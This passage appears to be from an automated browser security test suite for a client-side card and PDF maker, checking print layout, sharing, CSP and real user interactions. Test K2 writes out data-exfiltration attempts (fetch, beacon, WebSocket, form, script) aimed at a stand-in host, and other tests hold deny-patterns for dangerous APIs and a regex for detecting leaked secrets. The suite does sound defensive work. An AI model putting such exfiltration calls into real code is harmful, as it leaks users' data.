  await pr.open(); await pr.eval(pageHelpers);
  await test('H1. In print mode only the sheets are visible: no menus, buttons, status messages, dialogs, help', async () => {
    await pr.eval(`(async()=>{await addFiles([await canvasFile(300,300,'#019bab','a.png','image/png')]);state.items[0].caption='Ваня';renderGallery();renderOutput();$('status').textContent='Служебное сообщение ZZ-STATUS';})()`);
    await pr.send('Emulation.setEmulatedMedia', { media: 'print' });
    const r = await pr.eval(`(()=>{const vis=el=>{const s=getComputedStyle(el);return s.display!=='none'&&s.visibility!=='hidden';};
      return {app:getComputedStyle(document.querySelector('.app')).display,root:getComputedStyle($('printRoot')).display,
        status:getComputedStyle($('status')).display,crop:getComputedStyle($('cropDialog')).display,help:getComputedStyle($('bgHelp')).display,
        sheets:$('printRoot').querySelectorAll('.sheet').length,
        ghost:[...document.querySelectorAll('#printRoot .ghost-edge')].every(e=>getComputedStyle(e).outlineStyle==='none'),
        rootText:$('printRoot').textContent};})()`);
    await pr.send('Emulation.setEmulatedMedia', { media: '' });
    assert.equal(r.app, 'none'); assert.equal(r.root, 'block'); assert.equal(r.status, 'none');
    assert.equal(r.crop, 'none'); assert.equal(r.help, 'none'); assert.equal(r.sheets, 1);
    assert.ok(!r.rootText.includes('ZZ-STATUS') && r.rootText.includes('Ваня'));
  });
  await test('H2. Sheet size in millimetres is exact (print accuracy): A4 sheet 210x297, card 50x50 mm', async () => {
    const r = await pr.eval(`(()=>{const s=document.querySelector('#printRoot .sheet');const c=s.querySelector('.sheet-card');return {sw:s.style.width,sh:s.style.height,cw:c.style.width,ch:c.style.height,css:$('pageCss').textContent};})()`);
    assert.deepEqual(r, { sw: '210mm', sh: '297mm', cw: '50mm', ch: '50mm', css: '@page{size:210mm 297mm;margin:0;}' });
  });

  // =========================================================
  // I. Matching mode ("Соедини линиями")
  // =========================================================
  const mt = await newPage();
  await mt.open(); await mt.eval(pageHelpers);
  await test('I1. Matching: only chosen left/right pictures are printed; "не использовать" photos never appear on the sheet', async () => {
    const r = await mt.eval(`(async()=>{
      await addFiles([await canvasFile(300,300,'#019bab','a.png','image/png'),await canvasFile(300,300,'#e5004f','b.png','image/png'),await canvasFile(300,300,'#89bd1e','c.png','image/png')]);
      state.items[0].caption='LEFT-ONE';state.items[1].caption='RIGHT-ONE';state.items[2].caption='SECRET-UNUSED-CHILD';
      document.querySelector('[data-mode=matching]').click();
      const s=document.querySelectorAll('.side-select');
      s[0].value='left';s[0].dispatchEvent(new Event('input',{bubbles:true}));s[1].value='right';s[1].dispatchEvent(new Event('input',{bubbles:true}));
      const plan=layoutPlan();const cards=[...document.querySelectorAll('#printRoot .sheet-card')].map(c=>({l:parseFloat(c.style.left),t:parseFloat(c.style.top),txt:c.textContent}));
      const pdf=await buildPdfFile();
      return {cards,plan:{pw:plan.page.w,m:plan.margin,cw:plan.card.w},rootText:$('printRoot').textContent,previewText:$('preview').textContent,pdf:pdf.size};})()`);
    assert.equal(r.cards.length, 2); assert.ok(!r.rootText.includes('SECRET-UNUSED') && !r.previewText.includes('SECRET-UNUSED'));
    const left = r.cards.find(c => c.txt === 'LEFT-ONE'), right = r.cards.find(c => c.txt === 'RIGHT-ONE');
    assert.equal(left.l, r.plan.m); assert.equal(right.l, r.plan.pw - r.plan.m - r.plan.cw);
    assert.ok(right.l - (left.l + r.plan.cw) >= 25, 'middle space for drawing lines too small');
    assert.ok(r.pdf > 1000);
  });
  await test('I2. Matching: too-wide cards give a clear warning instead of a broken or overlapping sheet', async () => {
    const r = await mt.eval(`(()=>{document.querySelector('[data-size="100"]').click();state.orient='portrait';$('orient').value='portrait';renderOutput();
      const w=$('warn');return {hidden:w.hidden,text:w.textContent,sheets:$('printRoot').children.length,printDisabled:$('savePdf').disabled};})()`);
    assert.equal(r.hidden, false); assert.ok(r.text.length > 10); assert.equal(r.sheets, 0); assert.equal(r.printDisabled, true);
  });
  await test('I3. Matching: switching modes back and forth does not leak or duplicate pictures', async () => {
    const r = await mt.eval(`(()=>{document.querySelector('[data-size="50"]').click();document.querySelector('[data-mode=cards]').click();
      const a=$('printRoot').querySelectorAll('.sheet-card').length;document.querySelector('[data-mode=matching]').click();const b=$('printRoot').querySelectorAll('.sheet-card').length;
      document.querySelector('[data-mode=cards]').click();return {cards:a,matching:b,items:state.items.length};})()`);
    assert.equal(r.cards, 3); assert.equal(r.matching, 2); assert.equal(r.items, 3);
  });
  await test('I4. Extreme card sizes and copy counts never hang or crash (1x1 cm cards, 30 copies)', async () => {
    const r = await mt.eval(`(async()=>{const t=Date.now();document.querySelector('[data-size=custom]').click();$('widthCm').value='1';$('widthCm').dispatchEvent(new Event('input'));$('heightCm').value='1';$('heightCm').dispatchEvent(new Event('input'));
      state.items.forEach(i=>i.copies=30);renderOutput();const pages=splitPages(layoutPlan()).length;const pdf=await buildPdfFile();
      for(const v of ['1e309','-5','abc','0x10','0.04','99999']){$('widthCm').value=v;$('widthCm').dispatchEvent(new Event('input'));$('widthCm').dispatchEvent(new Event('blur'));}
      return {ms:Date.now()-t,pages,pdf:pdf.size,w:state.wCm};})()`);
    assert.ok(r.ms < 30000 && r.pdf > 1000 && r.w >= 1 && r.w <= 40, JSON.stringify(r));
  });

  // =========================================================
  // J. iPhone / share behaviour (emulated; real iPhone cannot be tested here)
  // =========================================================
  const iphone = await newPage({ ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    init: `window.__shares=[];Object.defineProperty(navigator,'canShare',{configurable:true,value:d=>Array.isArray(d&&d.files)});
           Object.defineProperty(navigator,'share',{configurable:true,value:async d=>{window.__shares.push({keys:Object.keys(d),files:(d.files||[]).map(f=>({name:f.name,type:f.type,size:f.size}))});}});` });
  await iphone.open(); await iphone.eval(pageHelpers);
  await test('J1. iPhone: "Поделиться" passes only the PDF file to the system menu (no page address, text, title or caption)', async () => {
    await iphone.eval(`(async()=>{await addFiles([await canvasFile(300,300,'#019bab','Vanya-Petrov-photo.png','image/png')]);state.items[0].caption='Ваня Петров';renderGallery();renderOutput();})()`);
    for (let i = 0; i < 50; i++) { if (await iphone.eval('!!sharePdfCache')) break; await new Promise(r => setTimeout(r, 200)); }
    await iphone.eval(`$('sharePdf').click()`); await new Promise(r => setTimeout(r, 500));
    await iphone.eval(`$('savePdf').click()`); await new Promise(r => setTimeout(r, 500));
    const s = await iphone.eval('window.__shares');
    assert.equal(s.length, 2, JSON.stringify(s));
    for (const x of s) { assert.deepEqual(x.keys, ['files']); assert.equal(x.files.length, 1); assert.equal(x.files[0].name, 'ADK-kartochki.pdf'); assert.equal(x.files[0].type, 'application/pdf'); }
  });
  await test('J2. Shared PDF copy prepared in memory is dropped after any edit and after reset', async () => {
    await iphone.eval(`state.items[0].caption='Другое';renderOutput();`);
    assert.equal(await iphone.eval('sharePdfCache===null'), true);
    await iphone.eval(`document.getElementById('reset').click()`);
    assert.equal(await iphone.eval('sharePdfCache===null&&state.items.length===0'), true);
  });

  // =========================================================
  // K. CSP and external dependencies
  // =========================================================
  const cs = await newPage();
  await cs.open();
  await test('K1. Page declares a Content-Security-Policy that forbids network access except blob: and forbids forms/plugins/base', async () => {
    const csp = await cs.eval(`document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content||''`);
    assert.ok(csp, 'no CSP meta tag');
    for (const must of ["default-src 'none'", "connect-src blob:", "img-src blob:", "form-action 'none'", "base-uri 'none'", "object-src 'none'"])
      assert.ok(csp.includes(must), 'CSP lacks ' + must + ' :: ' + csp);
    assert.ok(!/(^|[ ;])(https?:|\*)/.test(csp.replace(/'none'/g, '')), 'CSP allows external origins: ' + csp);
    // data: is allowed for images only (inline picture data never touches the network).
    const withData = csp.split(';').map(x => x.trim()).filter(x => x.includes('data:')).map(x => x.split(' ')[0]);
    assert.deepEqual(withData, ['img-src'], 'data: allowed in: ' + withData);
    assert.ok(!csp.includes('unsafe-eval'));
  });
  await test('K2. CSP really blocks data leaving the page: fetch, image, beacon, WebSocket, form, script, iframe, stylesheet, font', async () => {
    const v = await cs.eval(`(async()=>{
      const bad='https://exfil.invalid/leak?x=1';
      const tryIt=f=>{try{return Promise.resolve(f()).then(()=>'sent',()=>'blocked');}catch(e){return 'blocked';}};
      await tryIt(()=>fetch(bad));
      await new Promise(r=>{const i=new Image();i.onload=i.onerror=r;i.src=bad;});
      try{navigator.sendBeacon(bad,'x');}catch(e){}
      try{const w=new WebSocket('wss://exfil.invalid/ws');w.onerror=()=>{};}catch(e){}
      const f=document.createElement('form');f.action=bad;f.method='post';document.body.append(f);try{f.submit();}catch(e){}f.remove();
      const s=document.createElement('script');s.src=bad;document.head.append(s);
      const fr=document.createElement('iframe');fr.src=bad;document.body.append(fr);
      const l=document.createElement('link');l.rel='stylesheet';l.href=bad;document.head.append(l);
      const st=document.createElement('style');st.textContent='@font-face{font-family:x;src:url('+bad+')}body{font-family:x;background:url('+bad+')}';document.head.append(st);
      await new Promise(r=>setTimeout(r,800));
      const out=[...window.__violations];fr.remove();s.remove();l.remove();st.remove();return out;})()`);
    const joined = v.join(' | ');
    for (const dir of ['connect-src', 'img-src', 'form-action', 'script-src', 'frame-src', 'style-src'])
      assert.ok(v.some(x => x.startsWith(dir) || (dir === 'frame-src' && x.startsWith('default-src'))) || v.some(x => x.includes(dir)), 'not blocked: ' + dir + ' :: ' + joined);
    console.log('     blocked by CSP:', [...new Set(v.map(x => x.split(' ')[0]))].join(', '));
  });
  await test('K3. Application code and markup have no external scripts, styles, fonts, images or CDN; only the 4 documented help links', () => {
    const urls = [...html.matchAll(/https?:\/\/[^\s"'<>)]+/g)].map(m => m[0]);
    const allowed = ['https://smartluvon.ai/udalit-fon', 'https://pixlr.com/remove-background/', 'https://velmet44.github.io/rmbg/', 'https://acetone.ai/'];
    const extra = urls.filter(u => !allowed.includes(u) && !u.startsWith('http://www.w3.org/'));
    assert.deepEqual(extra, []);
    const markup = html.replace(/<script>[\s\S]*<\/script>/, ''); // CSS and HTML only; code is checked in K5
    assert.ok(!/<script[^>]+src=|<link[^>]+href=|@import|@font-face|[:\s,]url\(/i.test(markup));
  });
  await test('K4. Help links open only on click, in a new tab, without sending the page address or access to this page', () => {
    const anchors = [...html.matchAll(/<a [^>]*href="https?:[^>]*>/g)].map(m => m[0]);
    assert.equal(anchors.length, 4);
    for (const a of anchors) assert.ok(/target="_blank"/.test(a) && /rel="noopener noreferrer"/.test(a), a);
  });
  await test('K5. No dangerous browser APIs in the code: eval, innerHTML, document.write, storage, cookies, XHR, WebSocket, service workers', () => {
    const banned = /\beval\s*\(|new Function|innerHTML|outerHTML|insertAdjacentHTML|document\.write|localStorage|sessionStorage|indexedDB|document\.cookie|XMLHttpRequest|WebSocket|sendBeacon|serviceWorker|postMessage|setAttribute\(\s*['"]on/;
    const hit = banned.exec(script);
    assert.ok(!hit, 'found: ' + (hit && hit[0]));
    // The only fetch is for a blob: address (own image data).
    const fetches = [...script.matchAll(/fetch\(([^)]*)\)/g)].map(m => m[1]);
    assert.deepEqual(fetches, ['item.url']);
    assert.ok(/item\.url\.startsWith\('blob:'\)/.test(script));
  });
  await test('K6. Old address page ADK_Card_Designer.html only redirects to its own folder (no open redirect)', () => {
    const old = readFileSync(new URL('../ADK_Card_Designer.html', import.meta.url), 'utf8');
    assert.ok(old.includes("location.replace('./'+location.search+location.hash)") && old.includes('url=./'));
    assert.ok(!/https?:\/\//.test(old.replace('<!doctype html>', '')));
  });
  await test('K7. Repository content: no images, archives or key files tracked; no tokens in source', async () => {
    const { execSync } = await import('node:child_process');
    const files = execSync('git ls-files', { cwd: new URL('..', import.meta.url) }).toString().split('\n').filter(Boolean);
    const bad = files.filter(f => /\.(png|jpe?g|webp|gif|heic|zip|pdf|pem|key|env|p12|sqlite|db)$/i.test(f));
    assert.deepEqual(bad, []);
    const secret = /(ghp_[A-Za-z0-9]{20,}|github_pat_|AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY|api[_-]?key\s*[:=]\s*['"][^'"]{8,})/i;
    for (const f of files) { if (/\.(md|html|mjs|yml|json|js)$/.test(f)) assert.ok(!secret.test(readFileSync(new URL('../' + f, import.meta.url), 'utf8')), 'possible secret in ' + f); }
  });
  // =========================================================
  // L. The CSP must not break any function: real clicks, real file input, drag and drop, paste,
  //    downloads, browser print-to-PDF, matching mode. Checked with zero CSP violations.
  // =========================================================
  const { mkdirSync, writeFileSync } = await import('node:fs');
  const fx = join(profile, 'fixtures'); mkdirSync(fx, { recursive: true });
  const fxFiles = ['a', 'b', 'c', 'd'].map((n, i) => { const p = join(fx, n + '.png'); writeFileSync(p, makePng(120 + i * 10, 90, {})); return p; });
  const lp = await newPage({ desktop: true });
  await lp.open(); await lp.eval(pageHelpers);
  const pdfPages = buf => (buf.toString('latin1').match(/\/Type \/Page \/Parent/g) || []).length;
  const chromePages = buf => (buf.toString('latin1').match(/\/Type \/Page\b(?!s)/g) || []).length;
  const newest = ext => readdirSync(downloads).filter(f => f.endsWith(ext)).map(f => [f, statSync(join(downloads, f)).mtimeMs]).sort((a, b) => b[1] - a[1])[0]?.[0];

  await test('L1. Real file picker (native file input): three files are added under CSP', async () => {
    await lp.send('DOM.enable');
    const { root } = await lp.send('DOM.getDocument', {});
    const { nodeId } = await lp.send('DOM.querySelector', { nodeId: root.nodeId, selector: '#files' });
    await lp.send('DOM.setFileInputFiles', { nodeId, files: fxFiles.slice(0, 3) });
    await lp.waitFor('state.items.length===3');
    assert.ok(/Добавлено: 3/.test(await lp.eval("$('status').textContent")));
  });
  await test('L2. Real drag and drop of a file onto the page', async () => {
    const data = { items: [], files: [fxFiles[3]], dragOperationsMask: 1 };
    for (const type of ['dragEnter', 'dragOver', 'drop']) await lp.send('Input.dispatchDragEvent', { type, x: 500, y: 400, data });
    await lp.waitFor('state.items.length===4');
  });
  await test('L3. Paste of an image from the clipboard', async () => {
    await lp.eval(`(async()=>{const dt=new DataTransfer();dt.items.add(await canvasFile(100,100,'#e5004f','clip.png','image/png'));
      document.body.dispatchEvent(new ClipboardEvent('paste',{clipboardData:dt,bubbles:true,cancelable:true}));})()`);
    await lp.waitFor('state.items.length===5');
  });
  await test('L4. Preview: real clicks on size, zoom and mode buttons keep the sheet valid', async () => {
    for (const sel of ['[data-size="30"]', '[data-zoom="large"]', '[data-zoom="fit"]', '[data-size="50"]']) await lp.click(sel);
    const r = await lp.eval(`({sheets:document.querySelectorAll('#preview .sheet').length,w:document.querySelector('#preview .sheet-view').getBoundingClientRect().width,
      cards:document.querySelectorAll('#printRoot .sheet-card').length,zoom:state.zoom})`);
    assert.equal(r.sheets, 1); assert.ok(r.w > 100); assert.equal(r.cards, 5); assert.equal(r.zoom, 'fit');
  });
  await test('L5. Caption typed with the real keyboard (insertText) and crop dialog opened/applied by real clicks', async () => {
    await lp.click('.crop-btn');
    await lp.eval(`$('cropCaption').focus()`); await lp.send('Input.insertText', { text: 'Кошка' });
    await lp.click('#cropApply');
    await lp.waitFor('$("cropDialog").hidden===true');
    assert.equal(await lp.eval(`state.items[0].caption`), 'Кошка');
    assert.equal(await lp.eval(`$('cropImage').getAttribute('src')`), null);
  });
  await test('L6. Several sheets: copies set through the real field give 3 sheets', async () => {
    await lp.eval(`$('sheetCopyInput').focus();$('sheetCopyInput').select()`); await lp.send('Input.insertText', { text: '30' });
    await lp.waitFor("document.querySelectorAll('#preview .sheet').length===3");
  });
  await test('L7. Real click on "Скачать PDF": the file is saved, valid, with 3 pages', async () => {
    const n = lp.downloads.length;
    await lp.waitFor("!$('savePdf').disabled"); await lp.click('#savePdf');
    for (let i = 0; i < 100 && lp.downloads.length === n; i++) await new Promise(r => setTimeout(r, 200));
    await new Promise(r => setTimeout(r, 800));
    const f = newest('.pdf'); assert.ok(f, 'no PDF saved');
    const buf = readFileSync(join(downloads, f));
    assert.ok(buf.toString('latin1').startsWith('%PDF-1.4')); assert.equal(pdfPages(buf), 3);
  });
  await test('L8. Real clicks "Ещё" → "Скачать PNG": ZIP with 3 valid PNG sheets is saved', async () => {
    const n = lp.downloads.length;
    await lp.click('#moreActions summary'); await lp.click('#savePng');
    for (let i = 0; i < 100 && lp.downloads.length === n; i++) await new Promise(r => setTimeout(r, 200));
    await new Promise(r => setTimeout(r, 1200));
    const f = newest('.zip'); assert.ok(f, 'no ZIP saved');
    const zip = readFileSync(join(downloads, f)); const names = [];
    for (let p = 0; p + 46 < zip.length; p++) if (zip.readUInt32LE(p) === 0x02014b50) names.push(zip.toString('latin1', p + 46, p + 46 + zip.readUInt16LE(p + 28)));
    assert.deepEqual(names, ['ADK-list-01.png', 'ADK-list-02.png', 'ADK-list-03.png']);
  });
  await test('L9. Browser "print to PDF" (real print path) under CSP: 3 A4 portrait pages, no interface printed', async () => {
    const r = await lp.send('Page.printToPDF', { preferCSSPageSize: true, printBackground: true });
    const buf = Buffer.from(r.data, 'base64'); const t = buf.toString('latin1');
    assert.equal(chromePages(buf), 3);
    const box = /\/MediaBox \[ ?0 0 ([\d.]+) ([\d.]+)/.exec(t);
    assert.ok(Math.abs(box[1] - 595.3) < 1.5 && Math.abs(box[2] - 841.9) < 1.5, box.slice(1, 3).join('x'));
  });
  await test('L10. "Картинки" mode with cut grid: preview, printing, PDF and PNG work', async () => {
    await lp.click('[data-mode="pictures"]');
    const r = await lp.eval(`(async()=>{const pdf=await buildPdfFile();const png=await buildPngFile();return {cuts:document.querySelectorAll('#printRoot .cut-grid-line').length,pdf:pdf.size,png:png.size,sheets:$('printRoot').children.length};})()`);
    assert.ok(r.cuts > 0 && r.pdf > 1000 && r.png > 500 && r.sheets >= 1, JSON.stringify(r));
    const pr = await lp.send('Page.printToPDF', { preferCSSPageSize: true, printBackground: true });
    assert.equal(chromePages(Buffer.from(pr.data, 'base64')), r.sheets);
  });
  await test('L11. "Соедини линиями" by real clicks: sides chosen in the interface, preview, printing, PDF and PNG all work', async () => {
    await lp.click('[data-mode="matching"]');
    await lp.eval(`state.items.forEach(i=>i.copies=1);renderGallery();renderOutput();`);
    for (let i = 0; i < 4; i++) {
      await lp.eval(`window.__sel=document.querySelectorAll('#gallery .side-select')[${i}];window.__sel.scrollIntoView({block:'center'})`);
      await lp.eval(`window.__sel.value='${i < 2 ? 'left' : 'right'}';window.__sel.dispatchEvent(new Event('input',{bubbles:true}));window.__sel.dispatchEvent(new Event('change',{bubbles:true}))`);
    }
    const r = await lp.eval(`(async()=>{const pdf=await buildPdfFile();const png=await buildPngFile();const plan=layoutPlan();
      return {orient:state.orient,cards:document.querySelectorAll('#printRoot .sheet-card').length,sheets:$('printRoot').children.length,pdf:pdf.size,png:png.size,pw:plan.page.w,
        summary:$('summary').textContent,cuts:document.querySelectorAll('#printRoot .cut-grid-line').length};})()`);
    assert.equal(r.orient, 'landscape'); assert.equal(r.cards, 4); assert.equal(r.sheets, 1); assert.equal(r.cuts, 0); assert.ok(r.pdf > 1000 && r.png > 500);
    const pr = await lp.send('Page.printToPDF', { preferCSSPageSize: true, printBackground: true });
    const buf = Buffer.from(pr.data, 'base64'); assert.equal(chromePages(buf), 1);
    const box = /\/MediaBox \[ ?0 0 ([\d.]+) ([\d.]+)/.exec(buf.toString('latin1'));
    assert.ok(Math.abs(box[1] - 841.9) < 1.5 && Math.abs(box[2] - 595.3) < 1.5, 'landscape expected: ' + box.slice(1, 3).join('x'));
    assert.ok(r.summary.includes('две колонки'));
  });
  await test('L12. Help window: warning about third-party sites is shown, all 4 links kept, Escape closes it', async () => {
    await lp.click('#bgHelpBtn');
    const r = await lp.eval(`({visible:!$('bgHelp').hidden,text:$('bgHelpCard').textContent,links:[...document.querySelectorAll('#bgHelp a')].map(a=>a.href)})`);
    assert.equal(r.visible, true);
    assert.ok(r.text.includes('Обратите внимание: это сторонние сайты. При загрузке фотографии она может передаваться на их серверы. Не используйте такие сервисы для фотографий детей без соответствующего разрешения.'));
    assert.deepEqual(r.links, ['https://smartluvon.ai/udalit-fon', 'https://pixlr.com/remove-background/', 'https://velmet44.github.io/rmbg/', 'https://acetone.ai/']);
    await lp.send('Input.dispatchKeyEvent', { type: 'rawKeyDown', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 });
    await lp.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 });
    assert.equal(await lp.eval(`$('bgHelp').hidden`), true);
  });
  await test('L13. Real click on "Начать заново" clears everything', async () => {
    await lp.click('#reset');
    assert.equal(await lp.eval('state.items.length+$("printRoot").children.length+$("gallery").querySelectorAll("img").length'), 0);
  });
  await test('L14. The whole real-interaction session produced no CSP violations and no console errors', async () => {
    const v = await lp.eval('window.__violations');
    const bad = lp.logs.filter(l => !/favicon|404/i.test(l));
    assert.deepEqual(v.concat(bad), []);
    assert.ok(lp.downloads.length >= 2, 'expected PDF and ZIP downloads, got ' + JSON.stringify(lp.downloads));
    const external = lp.requests.filter(u => !u.startsWith(origin) && !u.startsWith('blob:') && !u.startsWith('data:'));
    assert.deepEqual(external, []);
  });
} finally {
  const passed = results.filter(r => r[1] === 'PASS').length;
  console.log('\n' + passed + '/' + results.length + ' security checks passed');
  try { ws.close(); } catch {}
  proc.kill();
  server.close();
  await new Promise(r => setTimeout(r, 800));
  try { rmSync(profile, { recursive: true, force: true }); } catch {}
  process.exit(process.exitCode || 0);
}
